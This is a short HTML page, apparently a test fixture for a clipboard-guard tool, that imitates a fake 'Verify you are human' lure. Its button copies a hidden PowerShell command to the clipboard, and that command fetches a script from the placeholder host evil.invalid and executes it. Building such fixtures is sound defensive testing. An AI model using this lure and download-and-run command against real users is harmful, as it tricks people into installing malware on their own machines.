<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Click + writeText</title>
<script src="common.js"></script></head>
<body><h1>Click + writeText</h1>
<button id="go">Verify you are human</button>
<script>document.getElementById("go").addEventListener("click",()=>window.__clipguard.writeText(`powershell -w hidden -c "iwr https://evil.invalid/a.ps1 | iex"`));</script>
</body></html>
